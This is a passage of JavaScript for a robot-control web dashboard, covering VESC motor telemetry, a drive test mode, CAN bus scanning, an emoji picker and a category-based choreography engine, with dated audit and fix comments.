    const d = await api('/vesc/config');
    if (!d) return;
    this._updateScale(d.power_scale);
    this._invertL = !!d.invert_L;
    this._invertR = !!d.invert_R;
    this._applyInvertUI('L', this._invertL);
    this._applyInvertUI('R', this._invertR);
    // Sync drive mode button
    _vescDutyMode = !!d.duty_mode;
    const btn  = el('vesc-mode-btn');
    const hint = el('vesc-mode-hint');
    if (btn)  btn.textContent = _vescDutyMode ? 'DUTY' : 'RPM';
    if (hint) hint.textContent = _vescDutyMode
      ? 'Direct duty — duty reacts immediately (bench testing without motor)'
      : 'Closed-loop speed — switch to DUTY for bench testing without motor';
    // Sync bench mode button
    _applyBenchModeUI(!!d.bench_mode);
  }

  _updateStatus(d) {
    const pill  = el('vesc-conn-pill');
    const label = el('vesc-conn-label');
    if (!pill) return;
    if (d.connected) {
      pill.classList.add('online');
      label.textContent = 'ONLINE';
    } else {
      pill.classList.remove('online');
      label.textContent = 'OFFLINE';
    }
    const src = d.L || d.R;
    const vEl  = el('vesc-voltage');
    const fill = el('vesc-battery-fill');
    if (src && vEl) {
      const v   = src.v_in;
      const col = batteryGauge.voltToColor(v);
      vEl.textContent = v.toFixed(1);
      vEl.className = 'vesc-battery-value' + (col === '#ff2244' ? ' danger' : col === '#ff8800' ? ' warn' : '');
      const pct = batteryGauge.voltToPct(v);
      if (fill) { fill.style.width = pct + '%'; fill.style.background = col; }
    } else if (vEl) { vEl.textContent = '--.-'; }
  }

  _updateCard(side, data) {
    const s     = side.toLowerCase();
    const fault = el(`v${s}-fault`);
    const card  = el(`vesc-card-${side}`);
    if (!data) {
      if (fault) { fault.textContent = 'OFFLINE'; fault.className = 'vesc-fault'; }
      if (card)  card.classList.remove('fault-active');
      ['temp','curr','rpm','duty','power'].forEach(k => {
        const e = el(`v${s}-${k}`); if (e) e.textContent = '--';
      });
      ['temp-bar','curr-bar','duty-bar'].forEach(k => {
        const b = el(`v${s}-${k}`); if (b) { b.style.width = '0%'; b.className = 'vesc-brow-fill'; }
      });
      return;
    }

    const duty    = Math.abs(data.duty);
    const dutyPct = Math.round(duty * 100);
    const currAbs = Math.abs(data.current);
    const power   = Math.round(data.v_in * currAbs);

    // Temp bar — thresholds: warn 60°C, danger 80°C
    this._setBar(`v${s}-temp-bar`, data.temp, 100, data.temp >= 80 ? 'danger' : data.temp >= 60 ? 'warn' : '');
    this._setBar(`v${s}-curr-bar`, currAbs,   30,  currAbs >= 25  ? 'danger' : currAbs >= 20  ? 'warn' : '');
    this._setBar(`v${s}-duty-bar`, dutyPct,   100, dutyPct >= 90  ? 'danger' : dutyPct >= 75  ? 'warn' : '');

    // Numeric values
    const tempCls = data.temp >= 80 ? 'danger' : data.temp >= 60 ? 'warn' : '';
    const currCls = currAbs  >= 25  ? 'danger' : currAbs  >= 20  ? 'warn' : '';
    const dutyCls = dutyPct  >= 90  ? 'danger' : dutyPct  >= 75  ? 'warn' : '';
    this._setVal(`v${s}-temp`,  data.temp.toFixed(1), tempCls);
    this._setVal(`v${s}-curr`,  currAbs.toFixed(1),   currCls);
    this._setVal(`v${s}-duty`,  dutyPct,               dutyCls);
    this._setVal(`v${s}-rpm`,   Math.abs(data.rpm),    '');
    this._setVal(`v${s}-power`, power,                 '');

    // Fault
    const isFault = data.fault !== 0;
    if (fault) {
      fault.textContent = data.fault_str || 'NONE';
      fault.className   = 'vesc-fault ' + (isFault ? 'error' : 'ok');
    }
    if (card) card.classList.toggle('fault-active', isFault);

    // Log new faults
    if (isFault && data.fault !== this._lastFault[side]) {
      this._logFault(side, data.fault_str || `FAULT_${data.fault}`);
    }
    this._lastFault[side] = data.fault;

    // Session peaks
    const p = this._peaks;
    if (side === 'L') {
      if (p.tempL === null || data.temp > p.tempL) { p.tempL = data.temp; this._setPeak('peak-temp-l', data.temp.toFixed(1)); }
      if (p.currL === null || currAbs > p.currL)   { p.currL = currAbs;   this._setPeak('peak-curr-l', currAbs.toFixed(1)); }
    } else {
      if (p.tempR === null || data.temp > p.tempR) { p.tempR = data.temp; this._setPeak('peak-temp-r', data.temp.toFixed(1)); }
      if (p.currR === null || currAbs > p.currR)   { p.currR = currAbs;   this._setPeak('peak-curr-r', currAbs.toFixed(1)); }
    }
    if (p.duty === null || dutyPct > p.duty) { p.duty = dutyPct; this._setPeak('peak-duty', dutyPct); }
  }

  _setBar(id, val, max, cls) {
    const b = el(id); if (!b) return;
    b.style.width = Math.min(100, Math.max(0, val / max * 100)).toFixed(1) + '%';
    b.className   = 'vesc-brow-fill' + (cls ? ' ' + cls : '');
  }

  _setVal(id, val, cls) {
    const e = el(id); if (!e) return;
    e.textContent = val;
    e.className   = cls ? `vesc-brow-val ${cls}` : '';
  }

  _setPeak(id, val) {
    const e = el(id); if (e) e.textContent = val;
  }

  _updateScale(scale) {
    const slider = el('vesc-scale-slider');
    const label  = el('vesc-scale-label');
    const info   = el('vesc-scale-pct');
    const pct    = Math.round(scale * 100);
    if (slider && slider !== document.activeElement) { slider.value = pct; _updateSliderBg(slider); }
    if (label) label.textContent = pct + '%';
    if (info)  info.textContent  = pct;
  }

  _updateSymmetry(dL, dR) {
    const symEl = el('vesc-symmetry');
    if (!dL || !dR) {
      ['sym-rpm','sym-curr','sym-status'].forEach(id => { const e = el(id); if (e) e.textContent = '—'; });
      if (symEl) { el('sym-status').className = 'vesc-sym-status'; }
      return;
    }
    const rpmDelta  = Math.abs(Math.abs(dL.rpm) - Math.abs(dR.rpm));
    const currDelta = Math.abs(Math.abs(dL.current) - Math.abs(dR.current));
    const isMoving  = Math.abs(dL.rpm) > 50 || Math.abs(dR.rpm) > 50;

    const rpmEl  = el('sym-rpm');  if (rpmEl)  rpmEl.textContent  = rpmDelta > 0 ? rpmDelta + ' rpm' : '—';
    const currEl = el('sym-curr'); if (currEl) currEl.textContent = currDelta.toFixed(1) + ' A';

    const statusEl = el('sym-status');
    if (statusEl) {
      if (!isMoving) {
        statusEl.textContent = 'IDLE'; statusEl.className = 'vesc-sym-status';
      } else if (rpmDelta > 500 || currDelta > 5) {
        statusEl.textContent = 'ASYMMETRIC'; statusEl.className = 'vesc-sym-status warn';
      } else {
        statusEl.textContent = 'BALANCED'; statusEl.className = 'vesc-sym-status ok';
      }
    }
  }

  _updateLastUpdate() {
    const e = el('vesc-last-update');
    if (e) {
      const now = new Date();
      e.textContent = now.toLocaleTimeString('en-CA', { hour12: false });
    }
  }

  _logFault(side, name) {
    const now  = new Date();
    const time = now.toLocaleTimeString('en-CA', { hour12: false });
    this._faultLog.unshift({ time, side, name });
    if (this._faultLog.length > 20) this._faultLog.pop();
    this._peaks.faults++;
    const countEl = el('peak-faults'); if (countEl) countEl.textContent = this._peaks.faults;
    this._renderFaultLog();
  }

  _renderFaultLog() {
    const container = el('vesc-fault-log'); if (!container) return;
    if (this._faultLog.length === 0) {
      container.innerHTML = '<div class="vesc-faultlog-empty">No faults this session.</div>';
      return;
    }
    container.innerHTML = this._faultLog.map(e =>
      `<div class="vesc-fault-entry">` +
      `<span class="vesc-fault-entry-time">${e.time}</span>` +
      `<span class="vesc-fault-entry-side">${e.side}</span>` +
      `<span class="vesc-fault-entry-name">${e.name}</span>` +
      `</div>`
    ).join('');
  }

  _applyInvertUI(side, state) {
    const btn = el(`vesc-inv-${side}`); if (!btn) return;
    const label = side === 'L' ? '⟲ LEFT' : 'RIGHT ⟳';
    btn.textContent = `${label}: ${state ? 'INVERTED' : 'NORMAL'}`;
    btn.classList.toggle('inverted', state);
  }

  initSlider() {
    const slider = el('vesc-scale-slider');
    const label  = el('vesc-scale-label');
    const info   = el('vesc-scale-pct');
    if (!slider) return;
    _updateSliderBg(slider);
    const updateTier = (pct) => {
      // W1 fix 2026-05-16: live tier hint reacts to power slider
      const tier = el('vesc-scale-tier');
      if (!tier) return;
      let txt, cls;
      if (pct <= 25)      { txt = 'CRAWL — robot will feel sluggish'; cls = 'tier-low'; }
      else if (pct <= 50) { txt = 'MODERATE — safe for tight spaces'; cls = 'tier-mid'; }
      else if (pct <= 80) { txt = 'NORMAL — typical demo speed';      cls = 'tier-norm'; }
      else                { txt = 'FULL THROTTLE — ensure clear space'; cls = 'tier-high'; }
      tier.textContent = txt;
      tier.className = 'vesc-scale-tier ' + cls;
    };
    updateTier(parseInt(slider.value, 10));
    slider.addEventListener('input', () => {
      const pct = parseInt(slider.value, 10);
      if (label) label.textContent = pct + '%';
      if (info)  info.textContent  = pct;
      _updateSliderBg(slider);
      updateTier(pct);
      clearTimeout(this._scaleDebounce);
      this._scaleDebounce = setTimeout(() => {
        api('/vesc/config', 'POST', { scale: pct / 100 });
      }, 200);
    });
  }
}

// W2 fix 2026-05-16: reset VESC config to safe defaults.
// power_scale=1.0, invert L/R off, bench OFF, RPM mode.
async function vescResetDefaults() {
  if (!confirm('Reset VESC config to defaults?\n\nPower 100% · Both motors NORMAL · Bench OFF · RPM mode\n\n(Operator can re-adjust after.)')) return;
  const results = await Promise.all([
    apiDetail('/vesc/config',     'POST', { scale: 1.0 }),
    apiDetail('/vesc/invert',     'POST', { side: 'L', state: false }),
    apiDetail('/vesc/invert',     'POST', { side: 'R', state: false }),
    apiDetail('/vesc/bench_mode', 'POST', { enabled: false }),
    apiDetail('/vesc/mode',       'POST', { duty: false }),
  ]);
  const failed = results.filter(r => !r.ok);
  if (failed.length) {
    toast(`Reset partially failed (${failed.length}/${results.length})`, 'error');
  } else {
    toast('VESC config reset to defaults ✓', 'ok');
  }
  await vescPanel.loadConfig();
}

const vescPanel = new VescPanel();

function _applyBenchModeUI(enabled) {
  const btn = el('vesc-bench-btn');
  if (!btn) return;
  btn.textContent = enabled ? 'ON' : 'OFF';
  btn.classList.toggle('active', enabled);
  // WOW polish H1 2026-05-15: when bench is ON, mark the whole VESC
  // settings panel with a screaming red border + diagonal stripes so
  // operator can't forget. The Drive tab already has the BENCH MODE
  // pill (D1) — this one is the in-settings warning.
  const panel = el('spanel-vesc');
  if (panel) panel.classList.toggle('bench-active', enabled);
}

function vescToggleBenchMode() {
  const btn = el('vesc-bench-btn');
  const enabled = btn && btn.textContent === 'OFF';
  _applyBenchModeUI(enabled);
  api('/vesc/bench_mode', 'POST', { enabled }).then(d => {
    if (d) toast(`Bench mode: ${enabled ? 'ON — safety lock bypassed' : 'OFF — full VESC check'}`, enabled ? 'warn' : 'ok');
  });
}

function vescToggleInvert(side) {
  const newState = side === 'L' ? !vescPanel._invertL : !vescPanel._invertR;
  if (side === 'L') vescPanel._invertL = newState;
  else              vescPanel._invertR = newState;
  vescPanel._applyInvertUI(side, newState);
  api('/vesc/invert', 'POST', { side, state: newState }).then(d => {
    if (d) toast(`Motor ${side}: ${newState ? 'INVERTED' : 'NORMAL'}`, 'ok');
  });
}

function vescResetPeaks() {
  vescPanel._peaks = { tempL: null, tempR: null, currL: null, currR: null, duty: null, faults: 0 };
  ['peak-temp-l','peak-temp-r','peak-curr-l','peak-curr-r','peak-duty'].forEach(id => {
    const e = el(id); if (e) e.textContent = '—';
  });
  const fc = el('peak-faults'); if (fc) fc.textContent = '0';
}

function vescClearLog() {
  vescPanel._faultLog = [];
  vescPanel._renderFaultLog();
}

// ================================================================
// VESC Drive Test Mode
// ================================================================

const vescTest = {
  _active:  false,
  _keys:    {},          // currently held keys
  _timer:   null,        // command loop interval (10 Hz)
  _pollTimer: null,      // fast telemetry poll (4 Hz — matches VESC telem rate)
  _SPEED:   0.4,         // test speed (40% — safe for bench)

  toggle() {
    this._active = !this._active;
    const btn  = el('vesc-test-toggle');
    const body = el('vesc-test-body');
    const card = el('vesc-test-card');
    if (btn)  { btn.textContent = this._active ? 'DISABLE' : 'ENABLE'; btn.classList.toggle('active', this._active); }
    if (body) body.style.display = this._active ? '' : 'none';
    if (card) card.classList.toggle('active', this._active);

    if (this._active) {
      this._timer = setInterval(() => this._tick(), 100);  // 10 Hz command loop
      // Tab already polls at 500ms; boost to 250ms during test mode
      _stopVescTabPoll();
      _vescTabTimer = setInterval(() => vescPanel.refresh(), 250);
    } else {
      clearInterval(this._timer);
      // Restore normal 500ms tab poll
      _stopVescTabPoll();
      _startVescTabPoll();
      this._keys = {};
      api('/motion/stop', 'POST');
      this._updateBars(0, 0);
      this._setStatus('IDLE', '');
      ['w','a','s','d'].forEach(k => {
        const e = el(`vt-kbd-${k}`); if (e) e.classList.remove('active');
      });
    }
  },

  onKey(code, down) {
    if (!this._active) return false;
    const map = { KeyW:'w', KeyA:'a', KeyS:'s', KeyD:'d', Escape:'esc' };
    const k = map[code];
    if (!k) return false;
    if (k === 'esc' && down) { this.toggle(); return true; }
    this._keys[k] = down;
    const e = el(`vt-kbd-${k}`); if (e) e.classList.toggle('active', down);
    return true;  // consumed — don't pass to drive tab
  },

  _tick() {
    if (!_vescDriveSafe) {
      this._updateBars(0, 0);
      this._setStatus('BLOCKED', 'err');
      return;
    }
    const fwd   = this._keys['w'];
    const back  = this._keys['s'];
    const left  = this._keys['a'];
    const right = this._keys['d'];
    const anyKey = fwd || back || left || right;

    if (!anyKey) {
      // No keys held — let BT controller drive freely, just show IDLE
      this._updateBars(0, 0);
      this._setStatus('BT/IDLE', '');
      return;
    }

    // Arcade mixing: throttle ± steer
    // W+A → curves left (L=20%, R=40%)   W+D → curves right (L=40%, R=20%)
    // A alone → spin left (-20%/+20%)    D alone → spin right (+20%/-20%)
    const throttle = (fwd ? 1 : 0) - (back ? 1 : 0);   // -1, 0, +1
    const steer    = (right ? 1 : 0) - (left ? 1 : 0);  // -1=left, +1=right

    let L = Math.max(-1, Math.min(1, throttle + steer * 0.5));
    let R = Math.max(-1, Math.min(1, throttle - steer * 0.5));
    L *= this._SPEED;
    R *= this._SPEED;

    _postMotion('/motion/drive', { left: L, right: R });
    this._updateBars(L, R);
    this._setStatus('DRIVING', 'ok');
  },

  _updateBars(L, R) {
    const lpct = Math.round(Math.abs(L) * 100);
    const rpct = Math.round(Math.abs(R) * 100);
    const lcls = L < 0 ? 'warn' : '';
    const rcls = R < 0 ? 'warn' : '';

    const lb = el('vt-left-bar');
    const rb = el('vt-right-bar');
    if (lb) { lb.style.width = lpct + '%'; lb.className = 'vesc-brow-fill' + (lcls ? ' ' + lcls : ''); }
    if (rb) { rb.style.width = rpct + '%'; rb.className = 'vesc-brow-fill' + (rcls ? ' ' + rcls : ''); }

    const lv = el('vt-left-val');  if (lv) lv.textContent = (L < 0 ? '-' : '') + lpct;
    const rv = el('vt-right-val'); if (rv) rv.textContent = (R < 0 ? '-' : '') + rpct;
  },

  _setStatus(text, cls) {
    const e = el('vt-status'); if (!e) return;
    e.textContent = text;
    e.className = 'vesc-sym-status' + (cls ? ' ' + cls : '');
  },

  // Called by VescPanel on each telemetry refresh
  updateTelem(dL, dR) {
    if (!this._active) return;
    const set = (id, val) => { const e = el(id); if (e) e.textContent = val ?? '—'; };
    set('vt-rpm-l',  dL ? Math.abs(dL.rpm) : null);
    set('vt-rpm-r',  dR ? Math.abs(dR.rpm) : null);
    set('vt-curr-l', dL ? dL.current.toFixed(1) + 'A' : null);
    set('vt-curr-r', dR ? dR.current.toFixed(1) + 'A' : null);
  },
};

function vescTestToggle() { vescTest.toggle(); }

let _vescDutyMode = false;
async function vescToggleDriveMode() {
  _vescDutyMode = !_vescDutyMode;
  await api('/vesc/mode', 'POST', { duty: _vescDutyMode });
  const btn  = el('vesc-mode-btn');
  const hint = el('vesc-mode-hint');
  if (btn)  btn.textContent = _vescDutyMode ? 'DUTY' : 'RPM';
  if (hint) hint.textContent = _vescDutyMode
    ? 'Direct duty — duty reacts immediately (bench testing without motor)'
    : 'Closed-loop speed — switch to DUTY for bench testing without motor';
}

// ================================================================
// CAN Bus Wizard
// ================================================================

const canWizard = {
  _scanning: false,

  async scan() {
    if (this._scanning) return;
    this._scanning = true;

    const btn    = el('can-scan-btn');
    const result = el('can-scan-result');
    if (btn) { btn.disabled = true; btn.innerHTML = '<span class="spin">⟳</span> SCANNING…'; }
    if (result) { result.textContent = ''; result.className = 'vesc-can-result'; }

    const d = await api('/vesc/can/scan');
    this._scanning = false;
    if (btn) { btn.disabled = false; btn.innerHTML = 'SCAN CAN BUS'; }

    if (!d || d.error) {
      const msg = (d && d.error) ? d.error : 'Connection failed';
      if (result) {
        result.innerHTML = `<span class="can-err">⚠ ${escapeHtml(msg)}</span>`;
        result.className = 'vesc-can-result show';
      }
      toast('CAN scan failed', 'warn');
      return;
    }
    this._displayResult(d.ids || []);
  },

  _displayResult(ids) {
    const result = el('can-scan-result');
    if (!result) return;

    let html = `<div class="can-found-header">FOUND ${ids.length} VESC${ids.length !== 1 ? 'S' : ''} ON CAN BUS</div>`;

    if (ids.length === 0) {
      html += `<p class="can-info">No VESCs found on CAN bus.<br>Check CAN H/L wiring between VESCs and ensure VESC 1 is connected via USB (/dev/ttyACM0).</p>`;
    } else {
      html += `<div class="can-id-list">`;
      ids.forEach(id => { html += `<span class="can-id-badge">CAN ID ${id}</span>`; });
      html += `</div>`;
      if (ids.length === 1) {
        html += `<p class="can-info">✓ VESC 2 found (CAN ID ${ids[0]}). VESC 1 (USB) is the gateway.</p>`;
      } else if (ids.filter(i => i === 0).length > 0 && ids.length > 1) {
        html += `<p class="can-warn">⚠ Multiple VESCs share CAN ID 0. Assign unique IDs via VESC Tool before operating.</p>`;
      } else {
        html += `<p class="can-info">✓ ${ids.length} VESCs found on CAN bus (IDs: ${ids.join(', ')}).</p>`;
      }
    }
    result.innerHTML = html;
    result.className = 'vesc-can-result show';
    toast(`CAN scan: ${ids.length} VESC${ids.length !== 1 ? 's' : ''} found`, ids.length > 0 ? 'ok' : 'warn');
  },
};

// ================================================================
// EmojiPicker — shared emoji picker component
// ================================================================

const EMOJI_SECTIONS = [
  { label: '😤 Émotions', emojis: ['😡','🤬','😤','😠','😱','😨','😰','😮','😲','🥹','🤩','😎','🥳','😏','🤔','🥸','😴','🤯','🫡','😈','👻','💀','🤖','👾'] },
  { label: '🎵 Musique & Sons', emojis: ['🎵','🎶','🎸','🎺','🪗','🥁','🎤','🎼','🪩','💿','📻','🔊','🔔','🎹','🎻','🎷'] },
  { label: '🎭 Show & Fête', emojis: ['🎭','🎉','🎊','🎂','🎈','🪅','🎆','🎇','🏆','🥇','🎖️','👑'] },
  { label: '🏃 Mouvement & Danse', emojis: ['🏃','🚶','💃','🕺','🌀','💫','🔄','↩️','🎯','🏹','👋','🫳'] },
  { label: '⚡ Actions & Alertes', emojis: ['⚡','🚨','🔴','🟠','🟡','🟢','💥','🔥','❄️','💣','🧨','☢️'] },
  { label: '🔧 Tech & Robot', emojis: ['🔧','⚙️','🔬','📡','🔍','💡','🔋','📱','🖥️','🎮','🕹️','🔌'] },
  { label: '⭐ Star Wars & Espace', emojis: ['⭐','🌟','✨','🚀','🛸','🌙','🪐','☄️','⚔️','🗡️','🔫','🐺','🦅','🏜️','🌌','👁️'] },
  { label: '🚪 Panneaux & Dôme', emojis: ['🚪','🔵','🟣','⭕','🔘','🪞','🎪','🎠'] },
];

class EmojiPicker {
  constructor() {
    this._selected   = '';
    this._callback   = null;
    this._allEmojis  = EMOJI_SECTIONS.flatMap(s => s.emojis);
    this._buildSections();
  }

  _buildSections() {
    const scroll = el('emoji-picker-scroll');
    if (!scroll) return;
    scroll.innerHTML = EMOJI_SECTIONS.map(sec => `
      <div class="emoji-picker-section-label">${sec.label}</div>
      <div class="emoji-picker-grid">
        ${sec.emojis.map(e =>
          `<div class="emoji-picker-btn" data-emoji="${e}" onclick="emojiPicker._pick('${e}')">${e}</div>`
        ).join('')}
      </div>`
    ).join('');
  }

  open(currentEmoji, callback) {
    this._selected = currentEmoji || '';
    this._callback = callback;
    el('emoji-picker-preview').textContent = this._selected || '?';
    el('emoji-picker-search').value = '';
    this._highlightSelected();
    el('emoji-picker-overlay').classList.remove('hidden');
    el('emoji-picker-search').focus();
  }

  _highlightSelected() {
    document.querySelectorAll('.emoji-picker-btn').forEach(b => {
      b.classList.toggle('selected', b.dataset.emoji === this._selected);
      b.style.display = '';
    });
    document.querySelectorAll('.emoji-picker-section-label').forEach(l => l.style.display = '');
  }

  _pick(emoji) {
    this._selected = emoji;
    el('emoji-picker-preview').textContent = emoji;
    document.querySelectorAll('.emoji-picker-btn').forEach(b =>
      b.classList.toggle('selected', b.dataset.emoji === emoji));
  }

  filter(query) {
    const q = query.trim().toLowerCase();
    document.querySelectorAll('.emoji-picker-btn').forEach(b => {
      b.style.display = (!q || b.dataset.emoji.includes(q)) ? '' : 'none';
    });
  }

  confirm() {
    if (this._callback) this._callback(this._selected);
    this.cancel();
  }

  cancel() {
    el('emoji-picker-overlay').classList.add('hidden');
    this._callback = null;
  }

  onOverlayClick(e) {
    if (e.target === el('emoji-picker-overlay')) this.cancel();
  }
}

const emojiPicker = new EmojiPicker();

// ================================================================
// ScriptEngine — Sequences tab with categories
// ================================================================

class ScriptEngine {
  constructor() {
    this._scripts    = [];   // [{name, label, category, emoji, duration}]
    this._categories = [];   // [{id, label, emoji, order}]
    this._running    = new Set();
    this._looping    = new Set();
    this._activeCategory = 'all';
    this._pillSortable   = null;
    this._longPressTimer = null;
    this._dragCard       = null;
    this._dragActive     = false;  // true while a card is being dragged — suppresses periodic reload
  }

  // ── Data loading ─────────────────────────────────────────────

  async load() {
    // F-17 (audit 2026-05-15): single-in-flight slot. load() is called
    // from init(), every tab switch to 'sequences', every 15s, and on
    // reconnect — rapid tab thrash or a brief offline blip used to
    // multiply requests. If a load is already in flight, return its
    // promise so callers still get a resolution.
    //
    // F-22 (audit 2026-05-15): also bail when a drag is in progress.
    // Admin operations (set-emoji, set-category, set-label, etc.) call
    // this.load() to refresh after the POST. If the user is mid-drag
    // when one of those races (e.g. an emoji-pick fires during a card
    // drag), grid.innerHTML rebuilds destroy the dragged card's DOM
    // element along with its pointer handlers' closures. The window-
    // level _winUp fallback already catches the drop, but the closure
    // leak is avoided entirely by deferring the reload here.
    if (this._loadInFlight) return this._loadInFlight;
    if (this._dragActive) {
      // Re-attempt on the next periodic tick — the 15s setInterval and
      // tab-switch paths will fire load() again once the drag is done.
      return Promise.resolve();
    }
    this._loadInFlight = (async () => {
      try {
        // EDGE-C1 fix 2026-05-16: raw fetch for /choreo/categories so
        // we can read the X-Categories-Version header (api() returns
        // body only). Used by _savePillOrder's If-Match check.
        const base = (typeof window.R2D2_API_BASE === 'string' && window.R2D2_API_BASE) ? window.R2D2_API_BASE : '';
        const [scripts, catsRes] = await Promise.all([
          api('/choreo/list'),
          fetch(base + '/choreo/categories').catch(() => null),
        ]);
        let cats = [];
        if (catsRes && catsRes.ok) {
          cats = await catsRes.json().catch(() => []);
          this._categoriesVersion = catsRes.headers.get('X-Categories-Version') || null;
        }
        this._scripts    = scripts || [];
        this._categories = (cats || []).slice().sort((a, b) => (a.order || 0) - (b.order || 0));
        this._renderPills();
        this._renderGrid();
        this._syncAdminMode();
        // S3 fix 2026-05-16: first-visit hint about loop gesture.
        // Long-press to loop is a power feature operators don't
        // discover. Toast once per session (localStorage flag).
        try {
          if (!localStorage.getItem('astromech-seq-hint-shown')) {
            localStorage.setItem('astromech-seq-hint-shown', '1');
            setTimeout(() => toast('Tap to play · Hold to loop · Double-click pill label to rename', 'info'), 800);
          }
        } catch {}
      } finally {
        this._loadInFlight = null;
      }
    })();
    return this._loadInFlight;
  }

  // ── Pills ─────────────────────────────────────────────────────

  _renderPills() {
    const container = el('seq-pills');
    if (!container) return;
    const isAdmin = adminGuard.unlocked;
    const cats = this._categories;

    // F-1 / F-2 (audit 2026-05-15): build pills with createElement +
    // textContent + addEventListener. The previous innerHTML template
    // string interpolated `c.emoji` raw and `c.id` into single-quoted
    // inline onclick attributes — escapeHtml() doesn't escape `'`, so
    // any attacker-controlled emoji or id (now reachable via the
    // server-side validation we added in B-2/B-3 for new writes, but
    // legacy data may exist) would break out and execute arbitrary JS
    // on every dashboard load. Stored XSS that can fire /system/estop
    // or worse. Using .textContent + dataset eliminates the sink
    // entirely — even a malicious emoji string just renders as text.
    container.replaceChildren();
    const make = (cls, ...children) => {
      const div = document.createElement('div');
      div.className = cls;
      children.forEach(ch => div.appendChild(ch));
      return div;
    };
    const txt = (tag, content, cls) => {
      const e = document.createElement(tag);
      e.textContent = content || '';
      if (cls) e.className = cls;
      return e;
    };

    // WOW polish G1 2026-05-15: count badges on category pills.
    // Parité avec Audio tab — operator voit instant "Happy (8) ·
    // Music (3) · Tests (1)" sans cliquer chaque catégorie.
    const totalCount = this._scripts.length;
    const countByCat = {};
    this._scripts.forEach(s => {
      const k = s.category || 'newchoreo';
      countByCat[k] = (countByCat[k] || 0) + 1;
    });

    // ALL pill
    const allActive = this._activeCategory === 'all' ? ' active' : '';
    const allPill = make('seq-pill' + allActive, txt('span', '🌐'),
                          document.createTextNode(' ALL'));
    allPill.dataset.cat = 'all';
    allPill.appendChild(txt('span', totalCount, 'seq-pill-count'));
    allPill.addEventListener('click', () => this.selectCategory('all'));
    container.appendChild(allPill);

    // Category pills
    cats.forEach(c => {
      const active = this._activeCategory === c.id ? ' active' : '';
      const adminCls = isAdmin ? ' admin-mode' : '';
      const count = countByCat[c.id] || 0;
      const emptyCls = count === 0 ? ' is-empty' : '';
      const pill = document.createElement('div');
      pill.className = 'seq-pill' + active + adminCls + emptyCls;
      pill.dataset.cat = c.id;
      pill.addEventListener('click', () => this.selectCategory(c.id));

      const emojiSpan = txt('span', c.emoji, 'seq-pill-emoji');
      if (isAdmin) {
        emojiSpan.addEventListener('click', (e) => this.onPillEmojiClick(e, c.id));
      }
      pill.appendChild(emojiSpan);
      // S5 fix 2026-05-16: label as its own span so we can replace it
      // with an inline input on dblclick (admin) without disturbing the
      // emoji/count siblings.
      const labelSpan = txt('span', ' ' + (c.label || ''), 'seq-pill-label');
      pill.appendChild(labelSpan);
      pill.appendChild(txt('span', count, 'seq-pill-count'));

      if (isAdmin && c.id !== 'newchoreo') {
        // S5 fix 2026-05-16: dblclick on label → inline rename
        // (operator double-tap on tablet works too). Reuses /choreo/
        // categories action=update which already supports `label`.
        labelSpan.addEventListener('dblclick', (e) => {
          e.stopPropagation();
          this._startCategoryRename(labelSpan, c.id, c.label || '');
        });
        labelSpan.title = 'Double-click to rename';
        labelSpan.style.cursor = 'text';

        const close = txt('span', '✕', 'seq-pill-close');
        close.addEventListener('click', (e) => this.deleteCategory(e, c.id));
        pill.appendChild(close);
      }
      container.appendChild(pill);
    });

    // Add-category pill
    if (isAdmin) {
      const add = txt('div', '+ Cat', 'seq-pill pill-add');
      add.addEventListener('click', () => this.createCategory());
      container.appendChild(add);
    }

    if (this._pillSortable) { this._pillSortable.destroy(); this._pillSortable = null; }
    if (isAdmin) {
      this._pillSortable = Sortable.create(container, {
        animation: 150,
        filter: '[data-cat="all"], .pill-add',
        // EDGE-C2 fix 2026-05-16: track active pill drag so the 15s
        // periodic reload doesn't destroy Sortable mid-gesture
        // (would orphan the ghost). Same pattern as _dragActive for
        // card drags.
        // S4 fix: drop-target visual hint (matches the card→pill
        // drag styling).
        ghostClass: 'seq-pill-ghost',
        chosenClass: 'seq-pill-chosen',
        onStart: () => { this._pillDragActive = true; },
        onEnd:   () => {
          this._pillDragActive = false;
          this._savePillOrder();
        },
      });
    }

    // S7 fix 2026-05-16: also show the operator-mode hint when locked.
    const hint = el('seq-admin-hint');
    const opHint = el('seq-operator-hint');
    if (hint)   hint.style.display   = isAdmin  ? 'block' : 'none';
    if (opHint) opHint.style.display = !isAdmin ? 'block' : 'none';
  }

  async _savePillOrder() {
    const pills = el('seq-pills').querySelectorAll('.seq-pill[data-cat]');
    const order = [...pills].map(p => p.dataset.cat).filter(id => id !== 'all');
    // EDGE-C1 fix 2026-05-16: send If-Match with the version we last
    // saw so concurrent admin reorders are detected (409). Without it,
    // last-writer-wins silently destroys the first admin's drag.
    // Falls back gracefully if _categoriesVersion isn't set yet
    // (server still accepts request without If-Match).
    try {
      const base = (typeof window.R2D2_API_BASE === 'string' && window.R2D2_API_BASE) ? window.R2D2_API_BASE : '';
      const headers = { 'Content-Type': 'application/json' };
      if (typeof adminGuard !== 'undefined' && adminGuard.getToken) {
        const tok = adminGuard.getToken(); if (tok) headers['X-Admin-Pw'] = tok;
      }
      if (this._categoriesVersion) headers['If-Match'] = this._categoriesVersion;
      const res = await fetch(base + '/choreo/categories', {
        method: 'POST', headers,
        body: JSON.stringify({ action: 'reorder', order }),
      });
      if (res.status === 409) {
        toast('Another admin reordered — refreshing pills', 'warn');
        await this.load();
        return;
      }
      if (!res.ok) {
        toast('Reorder failed — admin re-auth may be needed', 'error');
        return;
      }
      // Refresh version token from response (server's new mtime)
      const data = await res.json();
      this._categoriesVersion = res.headers.get('X-Categories-Version')
        || this._categoriesVersion;
      if (data && data.conflict) {
        toast('Pills refreshed — server had extra categories', 'info');
        await this.load();
      }
    } catch (e) {
      toast('Reorder network error', 'error');
    }
  }

  selectCategory(catId) {
    this._activeCategory = catId;
    // F-19 (audit 2026-05-15): toggle .active on existing pills instead
    // of nuking and rebuilding the whole pill row + Sortable instance.
    // Old _renderPills() also tore down and recreated the Sortable
    // drag-drop helper, which was wasteful on every click. The pill
    // row only needs a full rebuild when categories change (add /
    // delete / reorder / label edit), not on selection change.
    const container = el('seq-pills');
    if (container) {
      container.querySelectorAll('.seq-pill[data-cat]').forEach(p => {
        p.classList.toggle('active', p.dataset.cat === catId);
      });
    }
    this._renderGrid();
  }

  // S5 fix 2026-05-16: inline category rename without nuking the pill.
  // Replaces the .seq-pill-label span with an input on dblclick;
  // Enter or blur saves, Esc cancels. Server-side /choreo/categories
  // action=update already supports `label`.
  _startCategoryRename(labelSpan, catId, currentLabel) {
    const input = document.createElement('input');
    input.className = 'input-text seq-pill-rename-input';
    input.style.cssText = 'width:110px;font-size:11px;padding:2px 6px;';
    input.value = currentLabel;
